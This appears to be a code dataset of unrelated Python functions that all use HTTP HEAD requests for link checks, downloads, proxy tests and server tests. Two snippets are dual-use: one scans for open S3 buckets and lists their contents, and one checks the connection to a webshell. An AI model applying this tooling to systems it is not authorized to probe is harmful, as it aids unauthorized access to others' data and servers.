    gravatar = getattr(content, 'gravatar', None)
    if gravatar:
        params = {}

        if content.twitter:
            url = 'https://twitter.com/{}/profile_image?size=original'
            url = url.format(content.twitter)
            try:
                resp = requests.head(url)
                resp.raise_for_status()
                params['d'] = resp.headers['location']
            except Exception:
                pass

        if not params.get('d') and 'DEFAULT_GRAVATAR' in content.settings:
            default_gravatar_url = os.path.join(
                content.settings['SITEURL'],
                content.settings['DEFAULT_GRAVATAR']
            )
            params['d'] = default_gravatar_url

        params['s'] = str(content.settings.get('GRAVATAR_SIZE', GRAVATAR_SIZE))
        gravatar_url = (
            'http://www.gravatar.com/avatar/' +
            hashlib.md5(gravatar.lower().encode('utf-8')).hexdigest()
        )
        gravatar_url += '?' + urllib.parse.urlencode(params)
        content.gravatar = gravatar_url
    else:
        content.gravatar = None 
**************************************
def rest_api_head(self, rest_url, api_version):
        """
        HEAD request to the REST API
        :return: Request response
        """
        response = requests.head(
            "{org_instance}/services/data/v{api_version}/{rest_url}".format(
                org_instance=self.instance, api_version=api_version, rest_url=rest_url
            ),
            headers=self.sf_headers
        )

        return response 
**************************************
def is_working_url(self, url):
        try:
            response = requests.head(url,
                                     timeout=self.url_check_timeout,
                                     verify=self.verify_ssl)
            matches = []
            if response.status_code not in EXCEPTION_STATUS_CODES:
                matches = \
                    [re.match(pattern, str(response.status_code)) is not None
                     for pattern in INVALID_STATUS_CODES_REGEX]
            return True not in matches, response.status_code
        except Timeout:
            return False, 408
        except (RequestException, Exception):
            return False, None 
**************************************
def test_head_onion(self):
        '''test_head
        *description*
            Test the HEAD method is workable on hidden services or not.
            Test Case 1:  
            HEAD the [Green World](http://greenroxwc5po3ab.onion/).  

            Test Case 2:  
            HEAD the [Lambda](http://ze2djl7sv6m7eqzi.onion/)  

            Test Case 3:  
            Send HEAD to google 

        '''
        s = Session()
        s.cUrl.setopt(pycurl.VERBOSE, True)
        proxies = {
            'http' : 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9500'
        }
        r0   = s.head_onion('http://greenroxwc5po3ab.onion/')
        req0 = requests.head('http://greenroxwc5po3ab.onion/', proxies=proxies)
        self.assertEqual(r0.status, req0.status_code)
        self.assertEqual(r0.body,   req0.text)

        r1   = s.head_onion('http://ze2djl7sv6m7eqzi.onion/')
        req1 = requests.head('http://ze2djl7sv6m7eqzi.onion/', proxies=proxies)
        self.assertEqual(r1.status, req1.status_code)
        self.assertEqual(r1.body,   req1.text)

        r2 = s.head_onion('https://www.google.com')
        self.assertEqual(None, r2)

        r3 = s.head_onion('http://ze2djl7sv6m7eqzineverexist.onion/')
        self.assertEqual(None, r3)

        s.proxy.terminate() 
**************************************
def exists(site):
    """Summary
    
    Parameters
    ----------
    site : TYPE
        Description
    
    Returns
    -------
    TYPE
        Description
    """
    res = requests.head(site)
    return res.ok 
**************************************
def job(url, manga_name):
    def download(url, file_name, manga_name):
        if config['general']['short_title'] == 0:
            manga_name = manga_name.decode('utf-8')

        # That Unicode Stuff sucks so hard...
        if config['general']['save_path']:
            manga_path = os.path.dirname(config['general']['save_path']) + '/' + \
            manga_name + '/'
        else:
            manga_path = os.path.dirname(os.path.realpath(__file__)) + '/' + \
            manga_name + '/'
        try:
            os.makedirs(manga_path)
        except OSError:
            if not os.path.isdir(manga_path):
                raise
        #print("Download URL: ", url)
        with open(os.path.join(manga_path, file_name), "wb") as file:
            response = get(url)
            file.write(response.content)
    try:
        # Get HTTP Status Code
        # nhentai uses not only jpg.. argh
        # if 404 try some other Formats...
        # TODO: Rework this to read format out of HTML..
        formats = ["jpg", "png", "gif"]

        for i in formats:
            url_temp = url + i
            http_code  = requests.head(url_temp).status_code
            #print ("HTTP Code: ", http_code)
            if http_code == 200: # OK
                url = url_temp
                file_name = str(url.split('/')[-1])
                download(url, file_name, manga_name)

    except requests.ConnectionError:
        print("failed to connect") 
**************************************
def test_report(self, report: dict):
        for link in parse_links_from_statuses(report['statuses']):
            response = requests.head(link, allow_redirects=True, headers=HEADERS)
            resolved_url = response.url
            for regex in self.blocked:
                if re.search(regex, resolved_url):
                    return True
        return False 
**************************************
def get_download_size(url):
    try:
        # We don't want to download the package just yet
        response = requests.head(url, timeout=10)
    except requests.exceptions.RequestException as e:
        print('GET: %s' % url)
        raise SiphonCommandException(str(e))
    size = response.headers.get('content-length')
    if not size:
        size = response.headers.get('Content-Length')
    if not response.ok or not size or not size.isdigit():
        raise SiphonCommandException('Bad response from server. ' \
                'Please try again later.')
    return int(size) 
**************************************
def check_exists(url):
    with contextlib.closing(requests.head(url, allow_redirects=True)) as r:
        return r.status_code == requests.codes.ok 
**************************************
def search(self, params, cache_discovery=True):
        """Search for images and returns
        them using generator object
        :param params: search params
        :param cache_discovery whether or not to cache the discovery doc
        :return: yields url to searched image
        """

        search_params = self._search_params(params)

        res = self._query_google_api(search_params, cache_discovery)

        for image in res.get('items', []):
            try:
                response = requests.head(image['link'], timeout=5)
                content_length = response.headers.get('Content-Length')

                # check if the url is valid
                if response.status_code == 200 and \
                        'image' in response.headers['Content-Type'] and \
                        content_length:

                    # calculate download chunk size based on image size
                    self._fethch_resize_save.set_chunk_size(
                        image['link'], content_length
                    )

                    # if everything is ok, yield image url back
                    yield image['link']

                else:
                    # validation failed, go with another image
                    continue

            except requests.exceptions.ConnectTimeout:
                pass
            except requests.exceptions.SSLError:
                pass 
**************************************
def _get_url(links: Dict[str, str]) -> Optional[str]:
        # try to find githab or gitlub url and use it as a bug tracker
        for url in links.values():
            if not url.startswith('http'):
                url = 'https://' + url
            parsed = urlparse(url)
            if parsed.hostname not in ('github.com', 'gitlab.com', 'bitbucket.org'):
                continue

            # build URL
            parts = parsed.path.strip('/').split('/')
            if len(parts) < 2:
                continue
            url = 'https://{}/{}/{}/issues/new'.format(parsed.hostname, *parts)

            # check that issues aren't disabled for the project
            response = requests.head(url)
            if response.status_code == 404:
                continue

            return url

        # try to find custom bug tracker by name
        for name, url in links.items():
            if 'tracker' not in name.lower():
                continue
            if not url.startswith('http'):
                url = 'https://' + url
            return url

        return None 
**************************************
def _has_api(url: str) -> bool:
    if urlparse(url).hostname in ('pypi.org', 'python.org', 'test.pypi.org'):
        return True
    full_url = urljoin(url, 'dephell/json/')
    try:
        response = requests.head(full_url)
    except (SSLError, ConnectionError):
        return False
    return response.status_code < 400 
**************************************
def _test_proxy(self, proxy_name=None, test_url='http://www.google.com.hk/', reason=''):
        res = None
        try:
            if proxy_name:
                self.checking_proxy.add(proxy_name)

            def async_request():
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) '
                                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.41 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'close',
                    'Accept-Language': 'zh-CN,zh;q=0.8'
                    # 'Proxy-Name': '%s' % proxy_name
                }
                if proxy_name:
                    headers['Proxy-Name'] = proxy_name
                return requests.head(test_url, headers=headers, timeout=common.default_timeout+1, proxies={
                    "http": "http://127.0.0.1:%d" % (self._proxy_port-1),
                    "https": "http://127.0.0.1:%d" % (self._proxy_port-1)
                })
            res = yield from self._loop.run_in_executor(self.executor, async_request)
            logger.debug('_test_proxy(%s, %s) status_code: %d', proxy_name, reason, res.status_code)
            local_ip = res.headers.get('Proxy-LocalIP', None)
            return res.status_code, local_ip
        except BaseException as ex:
            logger.info('_test_proxy(%s, %s) %s: %s', proxy_name, reason, common.clazz_fullname(ex), ex)
        finally:
            if proxy_name:
                self.checking_proxy.remove(proxy_name)
            if res:
                res.close()
        return 500, None 
**************************************
def run(self, saved_state):
        # Read saved state and set HTTP headers.
        headers = {}
        if saved_state:
            # If both last modified and etag, set both.
            # Otherwise just interpret the whole field as last modified.
            last_modified = saved_state

            if len(saved_state.split(';')) == 2:
                last_modified, etag = saved_state.split(';')
                headers['If-None-Match'] = etag

            headers['If-Modified-Since'] = last_modified

        # Send head first to check 304.
        response = requests.head(self.url, headers=headers)

        # If not modified, return immediately.
        if response.status_code == 304:
            return saved_state, []

        # Otherwise, do the full request.
        response = requests.get(self.url, headers=headers)

        # Form saved state.
        last_modified = response.headers.get('Last-Modified')
        etag = response.headers.get('Etag')

        if etag:
            saved_state = ';'.join([str(last_modified), etag])
        else:
            saved_state = last_modified

        # Process text.
        artifact_list = self.process_element(response.text, self.url, include_nonobfuscated=True)

        return saved_state, artifact_list 
**************************************
def get_thoth_version(self) -> str:
        """Get version of Thoth backend."""
        _LOGGER.debug("Contacting Thoth at %r to receive version information", self.api_url)
        response = requests.head(self.api_url, verify=self.tls_verify)
        response.raise_for_status()
        return response.headers.get("X-Thoth-Version", "Not Available") 
**************************************
def exists(path):
    r = requests.head(path)
    return r.status_code == requests.codes.ok 
**************************************
def test_galaxy10(self):
        # make sure galaxy10 exists on Bovy's server

        r = requests.head(_G10_ORIGIN, allow_redirects=True)
        self.assertEqual(r.status_code, 200)
        r.close()

        galaxy10cls_lookup(0)
        self.assertRaises(ValueError, galaxy10cls_lookup, 11)
        galaxy10_confusion(np.ones((10,10))) 
**************************************
def authenticate_withings(username, password):
    """Authenticate based on username and md5 hashed password."""
    global pem
    if args.warning:
        try:
            requests.packages.urllib3.disable_warnings()
        except Exception:
            pass
    if args.insecure:
        pem = False
    else:
        try:
            import certifi
            pem = certifi.old_where()
        except Exception:
            pem = True
    requests.head(URL_USAGE, timeout=3, headers=HEADER, allow_redirects=True, verify=pem)
    payload = {'email': username, 'hash': hashlib.md5(password.encode('utf-8')).hexdigest(), 'duration': '900'}
    print("[-] Authenticating at scalews.withings.net")
    response = requests.post(URL_AUTH, data=payload)
    iddata = response.json()
    sessionkey = iddata['body']['sessionid']
    response = requests.get(URL_ASSO + sessionkey)
    iddata = response.json()
    deviceid = iddata['body']['associations'][0]['deviceid']
    return deviceid, sessionkey 
**************************************
def head_url(url):
    '''Returns a request HEAD object given a URL as a string'''
    return requests.head(add_schema(url)) 
**************************************
def connect(self, params={}):
        self.logger.info("Connect: Connecting..")
        url = params.get('url')
        try:
            r = requests.head(url)
            if r.status_code != 200:
                self.logger.error('Logstash: Connect: error %s', params)
        except requests.ConnectionError:
            self.logger.error('Logstash: Connect: error %s', params)
            raise Exception('Logstash: Connect: connection failed')

        self.url = url 
**************************************
def head(self, url):
    """head request, typically used for status code retrieval, etc.
    """
    bot.debug("HEAD %s" % url)
    return self._call(url, func=requests.head) 
**************************************
def download(self, url, file_name, headers=None, show_progress=True):

    """stream to a temporary file, rename on successful completion

        Parameters
        ==========
        file_name: the file name to stream to
        url: the url to stream from
        headers: additional headers to add
        force: If the final image exists, don't overwrite

    """

    fd, tmp_file = tempfile.mkstemp(prefix=("%s.tmp." % file_name))
    os.close(fd)

    # Should we verify the request?
    verify = self._verify()

    # Check here if exists
    if requests.head(url, verify=verify).status_code in [200, 401]:
        response = self.stream(url, headers=headers, stream_to=tmp_file)

        if isinstance(response, HTTPError):
            bot.error("Error downloading %s, exiting." % url)
            sys.exit(1)
        shutil.move(tmp_file, file_name)
    else:
        bot.error("Invalid url or permissions %s" % url)
    return file_name 
**************************************
def download(url, file_name, headers=None, show_progress=True):
    """stream to a temporary file, rename on successful completion

        Parameters
        ==========
        file_name: the file name to stream to
        url: the url to stream from
        headers: additional headers to add
    """

    fd, tmp_file = tempfile.mkstemp(prefix=("%s.tmp." % file_name))
    os.close(fd)

    if DISABLE_SSL_CHECK is True:
        bot.warning("Verify of certificates disabled! ::TESTING USE ONLY::")

    verify = not DISABLE_SSL_CHECK

    # Does the url being requested exist?
    if requests.head(url, verify=verify).status_code in [200, 401]:
        response = stream(url, headers=headers, stream_to=tmp_file)

        if isinstance(response, HTTPError):
            bot.error("Error downloading %s, exiting." % url)
            sys.exit(1)
        shutil.move(tmp_file, file_name)
    else:
        bot.error("Invalid url or permissions %s" % url)
    return file_name 
**************************************
def is_downloadable(url):
    """
    Does the url contain a downloadable resource
    """
    h = requests.head(url, allow_redirects=True)
    header = h.headers
    content_type = header.get('content-type')
    # content_length = header.get('content-length', 1e10)
    if 'text' in content_type.lower():
        return False
    if 'html' in content_type.lower():
        return False
    return True 
**************************************
def parse_xml(result, link):
    """ Parse XML results """
    # TO-DO: add unicode support
    try:
        root = ET.fromstring(result)
        for _ in root.iter('{http://s3.amazonaws.com/doc/2006-03-01/}Key'):
            target = link + "/" + _.text
            _ = requests.head(target)
            if _.status_code == 200:
                print target

    # TO-DO: add better parse error handling
    # If there is a known exception it would be better to catch that exception
    except:
        pass 
**************************************
def s3_scan(silent, bucket):
    """ Checks for open S3 buckets and returns content """
    if not silent:
        print "scanning bucket: " + bucket
    link = "https://" + bucket + ".s3.amazonaws.com"
    try:
        _ = requests.head(link)
        if _.status_code != 404:
            _ = requests.get(link)
            parse_xml(_.text, link)
    except requests.exceptions.RequestException as _:
        print _ 
**************************************
def get_from_cache(url, cache_dir=None):
    """
    Given a URL, look for the corresponding dataset in the local cache.
    If it's not there, download it. Then return the path to the cached file.
    """
    response = requests.head(url, allow_redirects=True)
    if response.status_code != 200:
        raise IOError("HEAD request failed for url {} with status code {}"
                      .format(url, response.status_code))
    etag = response.headers.get("ETag")
    filename = url_to_filename(url, etag)

    # get cache path to put the file
    cache_path = os.path.join(cache_dir, filename)

    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            print("%s not found in cache, downloading to %s", url, temp_file.name)

            http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)

            print("copying %s to cache at %s", temp_file.name, cache_path)
            with open(cache_path, 'wb') as cache_file:
                shutil.copyfileobj(temp_file, cache_file)

            print("creating metadata file for %s", cache_path)
            meta = {'url': url, 'etag': etag}
            meta_path = cache_path + '.json'
            with open(meta_path, 'w', encoding="utf-8") as meta_file:
                json.dump(meta, meta_file)

            print("removing temp file %s", temp_file.name)

    return cache_path 
**************************************
def check_if_page_exists(url):
    try:
        response = requests.head(url, timeout=5)
        status_code = response.status_code
        reason = response.reason
    except requests.exceptions.ConnectionError:
        status_code = 999
        reason = 'ConnectionError'
    if status_code == 200:
        return status_code
    else:
        print("Skipping Url (not found): " + str(url)) 
**************************************
def unwrap_30x(self, uri, timeout=10):

        domain = urlsplit(uri).netloc
        self._timeout = timeout

        loop_counter = 0
        try:

            if loop_counter > 5:
                raise ValueError("Infinitely looping redirect from URL: '%s'" % (uri,))

            # headers stop t.co from working so omit headers if this is a t.co link
            if domain == 't.co':
                r = requests.get(uri, timeout=self._timeout)
                return r.url, r.status_code
            # p.ost.im uses meta http refresh to redirect.
            if domain == 'p.ost.im':
                r = requests.get(uri, headers=HTTP_HEADER, timeout=self._timeout)
                uri = re.findall(r'.*url\=(.*?)\"\.*', r.text)[0]
                return uri, r.status_code
            else:

                while True:
                    try:
                        r = requests.head(uri, headers=HTTP_HEADER, timeout=self._timeout)
                    except (requests.exceptions.InvalidSchema, requests.exceptions.InvalidURL):
                        return uri, -1

                    retries = 0
                    if 'location' in r.headers and retries < self._maxretries:
                        r = requests.head(r.headers['location'])
                        uri = r.url
                        loop_counter += 1
                        retries = retries + 1
                    else:
                        return r.url, r.status_code


        except Exception as e:
            return uri, str(e) 
**************************************
def _unshorten_hrefli(self, uri):
        try:
            # Extract url from query
            parsed_uri = urlparse(uri)
            extracted_uri = parsed_uri.query
            if not extracted_uri:
                return uri, 200
            # Get url status code
            r = requests.head(extracted_uri, headers=HTTP_HEADER, timeout=self._timeout)
            return r.url, r.status_code
        except Exception as e:
            return uri, str(e) 
**************************************
def is_connected(self):
        """
        Test if internet connection is OK by connecting to the test URI provided.
        If proxy setting is set in the client, it will be used as well.
        :return: True if internet connection is on; False otherwise.
        """
        try:
            requests.head(self.test_uri, proxies=self.proxies)
            return True
        except requests.ConnectionError:
            return False 
**************************************
def headers(self):
        """ request headers """
        if not hasattr(self, '_headers'):
            resp = requests.head(self.identifier)  # TODO status handling for all these
            self._headers = resp.headers

        return self._headers 
**************************************
def _get_offset(self, file_endpoint, headers=None, auth=None):
        floyd_logger.debug("Getting offset")

        h = {"Tus-Resumable": self.TUS_VERSION}

        if headers:
            h.update(headers)

        response = requests.head(file_endpoint, headers=h, auth=auth)
        self.check_response_status(response)

        offset = int(response.headers["Upload-Offset"])
        floyd_logger.debug("offset: %s", offset)
        return offset 
**************************************
def __get_url_redirect(self, page='/roms/get-download.php'):
        url = DOMAIN + page
        payload = dict(gid=self.game_gid, test='true')
        r = requests.head(url, params=payload, headers=HEADERS,
                          allow_redirects=False)
        url = r.headers.get('Location')
        if r.status_code != 301:
            raise ServerError(f'Server returned {r.status_code} at redirect.')
        if url == '':
            return False
        return url 
**************************************
def __get_url_fileinfo(self, file_url):
        '''This methods returns the type of the file and its size'''
        r = requests.head(file_url, headers=HEADERS, allow_redirects=True)
        ftype = r.headers.get('Content-Type')
        size = r.headers.get('Content-Length', 0)
        return ftype, sizeof_fmt(int(size)) 
**************************************
def server_online(domain):
    try:
        requests.head("http://%s" % domain)
    except requests.exceptions.ConnectionError:
        return False

    return True 
**************************************
def is_downloadable(url):
	"""
	Does the url contain a downloadable resource
	"""
	from requests import head
	h = head(url, allow_redirects=True)
	header = h.headers
	content_type = header.get('content-type')
	if 'text' in content_type.lower():
	    return False
	if 'html' in content_type.lower():
	    return False
	return True 
**************************************
def check_connection(self, url):
        Log.info("Checking the connection to the webshell...")
        try:
            response = requests.head(url)
            code = response.status_code
            if code != 200:
                Log.warning("The status code is %d, the webshell may have some problems..." % (response.status_code))
            else:
                Log.success("The status code is %d" % (response.status_code))
            return True
        except:
            Log.error("Connection error!")
            return False 
**************************************
def download_file(url, target_path, show_progress=False, num_threads=1):
    """
    Download the file from the given `url` and store it at `target_path`.
    Return a tuple x (url, bool, str).
    x[0] contains the url.
    If download failed x[1] is ``False`` and x[2] contains some error message.
    If download was fine x[1] is ``True`` and x[2] contains the target-path.
    """

    if num_threads > 1:
        return download_file_parallel(
            url,
            target_path,
            show_progress=show_progress,
            num_threads=num_threads
        )

    r = requests.get(url, stream=True)

    if r.status_code != 200:
        return (url, False, 'Failed to download file {} (status {})!'.format(
            r.status_code,
            url
        ))

    if show_progress:
        file_size = int(requests.head(url).headers['Content-Length'])
        pbar = tqdm(total=file_size, desc='Download File', unit_scale=True)

    with open(target_path, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)

                if show_progress:
                    pbar.update(1024)

    if show_progress:
        pbar.close()

    return (url, True, target_path) 
**************************************
def test_unaffected():
    """Make sure URLs not mentioned in the file work as expected."""
    assert requests.head('http://localhost:8080').status_code == 200
    assert requests.head('http://localhost:8080/index.html').status_code == 200
    assert requests.head('http://localhost:8080/sub/sub.html').status_code == 200

    assert requests.head('http://localhost:8080/sub/').status_code == 403 
**************************************
def test_404():
    """Test ErrorDocument 404."""
    response = requests.get('http://localhost:8080/dne.html')
    assert response.status_code == 404
    assert response.text == 'This is the 404 page.\n'

    assert requests.head('http://localhost:8080/sub/dne.html').status_code == 404 
**************************************
def test_rewrite_legacy(path, location):
    """Test RewriteRules for legacy URLs.

    :param str path: URL to query.
    :param str location: Expected redirected URL in response.
    """
    response = requests.head(f'http://localhost:8080/{path}')
    expected = f'https://robpol86.com/{location}'
    assert response.status_code == 301
    assert response.headers['Location'] == expected 
**************************************
def test_rewrite_keywords(keyword, location):
    """Test RewriteRules for keywords.

    :param str keyword: Use in query URL.
    :param str location: Expected redirected URL in response.
    """
    expected = f'https://robpol86.com/{location}'
    for pre, post in (['', ''], ['one', 'two'], ['one/three', 'two/four.html']):
        response = requests.head(f'http://localhost:8080/{pre}{keyword}{post}')
        assert response.status_code == 301
        assert response.headers['Location'] == expected 
**************************************
def test_rewrite_deleted():
    """Test RewriteRules for deleted branch redirects."""
    # Redirect if file exists up one dir.
    response = requests.head('http://localhost:8080/sub/imagecfg.html')
    assert response.status_code == 301
    assert response.headers['Location'] == 'https://robpol86.com/imagecfg.html'
    # Don't redirect if file doesn't exists up one dir.
    response = requests.head('http://localhost:8080/sub/dne.html')
    assert response.status_code == 404
    # Don't redirect if requested file exists.
    response = requests.head('http://localhost:8080/branch/imagecfg.html')
    assert response.status_code == 200 
**************************************
def test_rewrite_catch_alls(path):
    """Test RewriteRules for catch all redirects.

    :param str path: URL to query.
    """
    response = requests.head(f'http://localhost:8080/{path}')
    assert response.status_code == 301
    assert response.headers['Location'] == 'https://robpol86.com/' 
**************************************
def __request(self, request, body=None, method=Request.Method.GET, debug=False):
        headers = {'Authorization': self.__access_token,
                   'content-Type': 'application/json',
                   'accept': 'application/json',
                   'User-Agent': 'ask-cli/1.0.0-beta.8 Node/v9.2.0'}
        if debug:
            print('DEBUG: __request: headers = {}'.format(headers))
            print('DEBUG: __request: {} {}'.format(method, self.ROOT + request))
        if method == Request.Method.GET:
            r = requests.get(self.ROOT + request, headers=headers)
            if r.status_code != 200:
                print(r, file=sys.stderr)
                print(json.loads(r.text)['message'], file=sys.stderr)
                raise RuntimeError('{}: {}'.format(r, r.json()['message']))
        elif method == Request.Method.POST:
            r = requests.post(self.ROOT + request, headers=headers, data=json.dumps(body))
            if debug:
                print('DEBUG: __request: body = {}'.format(body))
            if r.status_code != 200:
                print(r, file=sys.stderr)
                try:
                    print(r, file=sys.stderr)
                    print(r.json()['message'], file=sys.stderr)
                except JSONDecodeError as ex:
                    print('ERROR', file=sys.stderr)
                return None
        elif method == Request.Method.HEAD:
            r = requests.head(self.ROOT + request, headers=headers)
            if r.status_code != 200:
                print(r, file=sys.stderr)
                print(json.loads(r.text)['message'], file=sys.stderr)
                raise RuntimeError('{}: {}'.format(r, r.json()['message']))
            else:
                return r.headers
        else:
            raise RuntimeError('Unsupported method {}'.format(method))
        if debug:
            print('DEBUG: {} {} {}'.format(r.status_code, r.headers, r.text))
            print('DEBUG: ' + json.dumps(r.json(), indent=4, sort_keys=True))
        return r.json() 
**************************************
def server_started():
    try:
        return requests.head(URL).status_code == requests.codes.OK
    except Exception:
        return False 
**************************************
def find_current_data(self):
        """
            Find the current remote filename

            Make an HEAD request to grab information

            HTTPS web site. cert are stored in RPPS.PEM

        :return:
            remote_fn : remote zip filename
        """
        pem_filename = os.path.abspath(RPPS.PEM)
        req = requests.head(self.data_url, verify=pem_filename)

        _filename = None

        if req.status_code == 200:
            # Content-Disposition': 'attachment; filename=PS_LibreAcces_201808011050.zip'
            regex_filename = re.match(
                ".*?filename=(.*)", req.headers["Content-Disposition"]
            )
            if regex_filename:
                _filename = regex_filename.group(1)
        else:
            self.logger.warning(
                "Error accessing URL [{}] {}".format(req.status_code, self.data_url)
            )

        return _filename 
**************************************
def get_page_info(url):
    page = Article(url)
    page_og = OpenGraph()
    image_url = None
    global_type = None
    page_content = None

    def get_page_head():
        headers = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 '
                          '(KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2',
        }

        try:
            resp_headers = requests.head(url, headers=headers).headers
        except requests.exceptions.RequestException:
            raise LinkException('Failed to read link.')
        return resp_headers

    def get_title_from_url():
        name_url = splitext(basename(urlsplit(url).path))[0]
        words = re.findall(r'[a-zA-Z0-9]+', name_url)
        return ' '.join([word.capitalize() for word in words])

    def summary_from_text(txt, size=250):
        return txt[:size] if isinstance(txt, str) and len(txt) > size else txt

    def build_tags(*args):
        tags = reduce(operator.add, args)
        return list(filter(lambda x: bool(x), set(tags)))

    page_type, page_subtype = get_page_head()['Content-Type'].split('/')
    page_subtype = re.findall(r'[a-zA-Z0-9]+', page_subtype)[0]

    if page_type == 'image':
        image_url = url
        global_type = page_type

    if page_type == 'text':
        page.download()
        page_content = page.html

        if page_subtype == 'html':
            page_og = OpenGraph(html=page_content)
            page.parse()

    page_text = page.text or page_content

    return {
        'type': page_og.type or global_type or page_subtype,
        'title': page_og.title or page.title or get_title_from_url(),
        'summary': page_og.description or page.meta_description or summary_from_text(page_text),
        'image': page_og.image or page.meta_img or page.top_image or image_url,
        'tags': build_tags(page.meta_keywords, list(page.tags)),
        'publish_date': page.publish_date or None,
        'text': page_text,
    } 
**************************************
def generates_source_metadata(self):
        """Extracts and stores metadata for imported data sources. Metadata includes the date of download,
        date of last modification to the file, the difference in days between last date of modification and current
        download date, file size in bytes, path to file, and URL from which the file was downloaded for each data source

        Returns:
            metadata (list): A nested list, where first item is today's date and each remaining item is a list that
                            contains metadata information for each downloaded data source.
        """

        print('\n' + '=' * 100)
        print('Generating Metadata')
        print('=' * 100 + '\n')

        self.metadata.append(['#' + str(datetime.datetime.utcnow().strftime('%a %b %d %X UTC %Y')) + ' \n'])

        for i in tqdm(self.data_files.keys()):
            source = self.data_files[i]

            # get vars for metadata file
            try:
                file_info = requests.head(self.source_list[i])

                if 'modified' in [x.lower() for x in file_info.headers.keys()]:
                    mod_info = file_info.headers['modified'][0]

                elif 'Last-Modified' in [x.lower() for x in file_info.headers.keys()]:
                    mod_info = file_info.headers['Last-Modified'][0]

                elif 'Date' in [x.lower() for x in file_info.headers.keys()]:
                    mod_info = file_info.headers['Date']

                else:
                    mod_info = datetime.datetime.now().strftime('%a, %d %b %Y %X GMT')

            # for ftp downloads that don't have header info
            except requests.exceptions.InvalidSchema:
                mod_info = datetime.datetime.now().strftime('%a, %d %b %Y %X GMT')

            # reformat date
            mod_date = datetime.datetime.strptime(mod_info, '%a, %d %b %Y %X GMT').strftime('%m/%d/%Y')
            diff_date = (datetime.datetime.now() - datetime.datetime.strptime(mod_date, '%m/%d/%Y')).days

            # add metadata for each source as nested list
            source_metadata = ['DOWNLOAD_URL= {}'.format(str(self.source_list[i])),
                               'DOWNLOAD_DATE= {}'.format(str(datetime.datetime.now().strftime('%m/%d/%Y'))),
                               'FILE_SIZE_IN_BYTES= {}'.format(str(os.stat(self.data_files[i]).st_size)),
                               'FILE_AGE_IN_DAYS= {}'.format(str(diff_date)),
                               'DOWNLOADED_FILE_LOCATION= {}'.format(str(source)),
                               'FILE_LAST_MOD_DATE= {}'.format(str(mod_date))]

            self.metadata.append(source_metadata)

        return self.metadata 
**************************************
def _split_objects_from_urls(map_func_args_list, chunk_size, chunk_number):
    """
    Create partitions from a list of objects urls
    """
    if chunk_size or chunk_number:
        logger.info('Creating chunks from urls...')
    partitions = []
    parts_per_object = []

    def _split(entry):
        obj_size = None
        total_partitions = 0
        object_url = entry['url']
        metadata = requests.head(object_url)

        logger.info(object_url)

        if 'content-length' in metadata.headers:
            obj_size = int(metadata.headers['content-length'])

        chunk_size_co = chunk_size

        if chunk_number:
            chunk_rest = obj_size % chunk_number
            chunk_size_co = chunk_size_co // chunk_number + chunk_rest

        if chunk_size_co and chunk_size_co < CHUNK_SIZE_MIN:
            chunk_size_co = None

        if 'accept-ranges' in metadata.headers and chunk_size_co is not None \
           and obj_size is not None and obj_size > chunk_size_co:
            size = 0

            while size < obj_size:
                brange = (size, size+chunk_size_co+CHUNK_THRESHOLD)
                size += chunk_size_co
                partition = entry.copy()
                partition['url'] = CloudObjectUrl(object_url)
                partition['url'].data_byte_range = brange
                partition['url'].chunk_size = chunk_size_co
                partition['url'].part = total_partitions
                partitions.append(partition)
                total_partitions = total_partitions + 1
        else:
            # Only one partition
            partition = entry
            partition['url'] = CloudObjectUrl(object_url)
            partition['url'].data_byte_range = None
            partition['url'].chunk_size = chunk_size_co
            partition['url'].part = total_partitions
            partitions.append(partition)
            total_partitions = 1

        parts_per_object.append(total_partitions)

    pool = ThreadPool(128)
    pool.map(_split, map_func_args_list)
    pool.close()
    pool.join()

    return partitions, parts_per_object 
**************************************
def try_select_head_proxy(self, force_to_head=False, only_select=False, tp90_factor=1.1):
        if self._proxy_count <= 1:
            return False
        if self.fix_top:
            return None if only_select else False
        if force_to_head and not only_select:
            select_from = 0
            select_end = self._proxy_count - 1
        else:
            select_from = 1
            select_end = self._proxy_count
        head_proxy = self.head_proxy
        for proxy in sorted(self.proxy_list[select_from:select_end], key=sort_proxies):
            if head_proxy.sort_key > proxy.sort_key and not force_to_head:
                logger.debug("try_select_head_proxy(): NOT move %s to HEAD cause sort_key[%.1f] > head.sort_key(%s)", proxy, proxy.sort_key, head_proxy.sort_key)
                break
            if not (proxy.tp90 <= head_proxy.tp90*tp90_factor or (force_to_head and proxy.fail_rate <= common.fail_rate_threshold)):
                logger.debug("try_select_head_proxy(): NOT move %s to HEAD cause proxy.tp90 > head_proxy.tp90[%.1f]*tp90_factor[%.1f]",
                             proxy, head_proxy.tp90, tp90_factor)
                continue
            if proxy.error_time < common.retry_interval_on_error * proxy.error_count:
                logger.debug("try_select_head_proxy(): NOT move %s to HEAD cause error_time=%.1f < %.1fx%d",
                             proxy, proxy.error_time, common.retry_interval_on_error, proxy.error_count)
                continue
            if proxy.pause or (proxy.tp90_len == 0 and proxy.total_count > 0):
                logger.debug("try_select_head_proxy(): NOT move %s to HEAD cause pause=%s", proxy, proxy.pause)
                continue
            if only_select:
                return proxy
            # factor = proxy.factor
            # if int(factor/common.hundred) <= self.hundred_c or force_to_head:
            # move the proxy to head
            proxy.reset_stat_info()
            if head_proxy.hostname != proxy.hostname:
                self.proxy_list.remove(proxy)
                self.proxy_list.insert(0, proxy)
                logger.info("try_select_HEAD_proxy(): select %s to HEAD {global_tp90=%.1f[%s]}[%d:%d] old_head=%s %s", proxy,
                            ProxyStat.calc_tp90(), ProxyStat.get_global_tp90_inc(),
                            select_from, select_end, head_proxy, "by force" if force_to_head else '')
            else:
